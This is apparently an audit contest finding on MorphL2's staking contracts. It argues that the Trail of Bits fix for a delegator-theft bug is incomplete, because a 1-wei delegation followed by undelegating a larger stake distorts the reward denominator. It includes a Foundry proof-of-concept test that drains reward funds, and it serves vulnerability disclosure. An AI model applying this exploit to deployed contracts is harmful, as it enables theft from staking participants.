# Delegators may still be able to steal funds.

### Summary

**The code recommendation for the “Delegators can steal funds” issue from Trail of Bits, does not solve the problem perfectly. It's still leaves the “Delegators can steal funds” issue.**

### Root Cause

In the Trail of Bits audit report that reported the “Delegators can steal funds” issue, they provided a recommendation code to fix it.
And the sponsor implemented it accordingly in [L389](https://github.com/sherlock-audit/2024-08-morphl2/blob/98e0ec4c5bbd0b28f3d3a9e9159d1184bc45b38d/morph/contracts/contracts/l2/staking/L2Staking.sol#L389)
```solidity
 // notify undelegation to distribute contract
        IDistribute(DISTRIBUTE_CONTRACT).notifyUndelegation(
            delegatee,
            _msgSender(),
            effectiveEpoch,
=>       stakerDelegations[delegatee],
            delegators[delegatee].length()
        );
```
The `stakerDelegations[delegatee]` parameter in the `notifyUndelegation` parameter above comes from `stakerDelegations[delegatee] -= undelegation.amount;` 

Let's assume there is a `delegatee` named “delegateRich”, then andi and john do a “delegateStake” to `delegateRich` address of `1e18` each. Thus, the value of `stakerDelegations[delegatee]` is now `2e18`.

Then if jhon performs an “undelegateStake”, the value of `stakerDelegations[delegatee]` will be 1e18.

**Then, how did the issue of “Delegators can steal funds” still occur?**

Alright, let's turn andi and jhon into attackers.
- attacker (account1) performs “delegateStake” to address `delegateRich` with 1 wei.
- attacker (account2) performs “delegateStake” to address `delegateRich` with `1e18`.
- Thus, the value of `stakerDelegations[delegatee]` is now `1e18` + 1 wei.
- Then, the attacker (account2) performs “undelegateStake”, the value of `stakerDelegations[delegatee]` will be 1 wei.

As a result, attacker(account2) can steal funds by perform `L2Staking::claimReward` because the calculation on `Distribute::_claim` on [L343-345](https://github.com/sherlock-audit/2024-08-morphl2/blob/98e0ec4c5bbd0b28f3d3a9e9159d1184bc45b38d/morph/contracts/contracts/l2/staking/Distribute.sol#L343-L345) will be like this:
```solidity
 reward += (distributions[delegatee][i].delegatorRewardAmount * 1e18) / 1;
```
Q: Why the `delegationAmount` is 1 wei on calculation reward?
A: Since `stakerDelegations[delegatee]` is 1 wei when the attacker (account2) performs “undelegateStake”, the [delegationAmount] (https://github.com/sherlock-audit/2024-08-morphl2/blob/98e0ec4c5bbd0b28f3d3a9e9159d1184bc45b38d/morph/contracts/contracts/l2/staking/Distribute.sol#L130) will be 1 wei, which is the amount of the attacker (account1).


### Internal pre-conditions
- When first deploying/launching the L2Staking and Distribute contract or no one has yet become a “delegator” at the “delegatee” address.
- Only the attacker becomes a delegator at that "delegatee" address. This means that only the attacker performs the `delegateStake` function at that "delegatee" address. The attacker can create multiple accounts to manipulate this from sponsor, such as having about 10 attacker accounts that perform `delegateStake` at that "delegatee" address and 1 account that only performs `delegateStake` for 1 wei.



### Attack Path
- When the “delegatee” address has no delegator, the attacker sees this and then creates multiple accounts to manipulate the sponsor and perform “delegateStake”, each attacker account has a different amount of “delegateStake” and only one performs “delegateStake” for 1 wei. 
- Then, some of the attacker accounts perform “undelegateStake”, except for the attacker account that performs “delegateStake” for 1 wei. The value of `stakerDelegations[delegatee]` will be 1 wei.

As a result, attacker can steal funds by perform `L2Staking::claimReward` 

### Impact

Attacker can steal funds on distribute contract.

### PoC
- Paste the code below into `L2Staking.t.sol`
- run with `forge test -vv --match-test test_delegatorCanDrainFunds`
```solidity
function test_delegatorCanDrainFunds() public {
        sequencer.getSequencerSet2Size();
        address attacker = address(0x123);
        address attacker1 = address(0x231);

        hevm.startPrank(multisig);

        morphToken.transfer(attacker, morphBalance);
        morphToken.transfer(attacker1, morphBalance);
        hevm.stopPrank();

        hevm.startPrank(attacker);
        morphToken.approve(address(l2Staking), type(uint256).max);
        l2Staking.delegateStake(firstStaker, 5 ether);
        hevm.stopPrank();

        hevm.startPrank(attacker1);
        morphToken.approve(address(l2Staking), type(uint256).max);
        l2Staking.delegateStake(firstStaker, 1); // delegateStake 1 wei
        hevm.stopPrank();

        uint256 time = REWARD_EPOCH;
        hevm.warp(time);

        // reward starting
        // rewardStartTime = 86400
        // block.timeStamp >= rewardStartTime
        // candidateNumber > 0
        hevm.prank(multisig);
        l2Staking.startReward();

        // staker set commission
        hevm.prank(firstStaker);
        l2Staking.setCommissionRate(1);

        // *************** epoch = 1 ******************** //
        time = REWARD_EPOCH * 2;
        hevm.warp(time);

        uint256 blocksCountOfEpoch = REWARD_EPOCH / 3;
        hevm.roll(blocksCountOfEpoch * 2);
        hevm.prank(oracleAddress);
        record.setLatestRewardEpochBlock(blocksCountOfEpoch);
        _updateDistribute(0);

        // *************** epoch = 2 ******************** //
        time = REWARD_EPOCH * 3;
        hevm.roll(blocksCountOfEpoch * 3);
        hevm.warp(time);
        _updateDistribute(1);

        hevm.startPrank(attacker);
        l2Staking.undelegateStake(firstStaker);
        hevm.stopPrank();

        uint256 TotalstakerAmount = l2Staking.stakerDelegations(firstStaker);
        assertEq(TotalstakerAmount, 1); // delegationAmount now it's a amount of attacker1

        //  reward += (distributions[delegatee][i].delegatorRewardAmount * distributions[delegatee][i].amounts[delegator]) /
        //       TotalstakerAmount;

        uint256 attackerReward = distribute.queryUnclaimed(firstStaker, attacker);
        emit log_uint(attackerReward);
        
        hevm.startPrank(attacker);
        uint256 balanceBefore = morphToken.balanceOf(attacker);
        l2Staking.claimReward(firstStaker, 1);
        uint256 balanceAfter = morphToken.balanceOf(attacker);

        assertEq(balanceAfter, balanceBefore + attackerReward);
        hevm.stopPrank();
    }

```
### Mitigation

It must be verified that no delegator has made a `delegateStake` with an amount of 1 wei or the sponsor must be the first delegator.
